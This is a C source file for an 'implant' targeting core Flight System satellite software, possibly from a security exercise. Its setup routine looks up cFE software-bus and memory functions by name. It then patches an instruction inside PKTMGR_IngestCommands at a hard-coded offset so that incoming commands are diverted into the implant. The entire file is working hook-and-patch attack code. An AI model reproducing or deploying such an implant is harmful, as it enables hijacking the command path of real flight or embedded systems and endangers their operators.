#include "implant.h"


#define EXPECTED_OFFSET (0x118e4-0x11274)

void setup(fn_table_t *fn_table){
    int32_t offset = 0;
    int* hook_addr = 0;
    fn_table->unlocked = 0;
    
    fn_table->OS_SymbolLookup(&fn_table->CFE_SB_GetMsgId, 
                                "CFE_SB_GetMsgId");

    fn_table->OS_SymbolLookup(&fn_table->CFE_SB_GetCmdCode, 
                                "CFE_SB_GetCmdCode");

    fn_table->OS_SymbolLookup(&fn_table->CFE_SB_GetTotalMsgLength, 
                                "CFE_SB_GetTotalMsgLength");

    fn_table->OS_SymbolLookup(&fn_table->CFE_SB_SendMsg, 
                                "CFE_SB_SendMsg");
    
    fn_table->OS_SymbolLookup(&fn_table->CFE_EVS_SendEvent, 
                                "CFE_EVS_SendEvent");
        
    fn_table->OS_SymbolLookup(&fn_table->CFE_PSP_MemRead8, 
                                "CFE_PSP_MemRead8");
    
    fn_table->OS_SymbolLookup(&fn_table->PKTMGR_IngestCommands,
                                "PKTMGR_IngestCommands");

    
    hook_addr  = (int*)(EXPECTED_OFFSET + (char*)fn_table->PKTMGR_IngestCommands);
    offset = (int32_t)fn_table - (int32_t)hook_addr - 0x8;
    *hook_addr = 0x40000000 | (0x3FFFFFFF & (offset >> 2));

    return; 
}
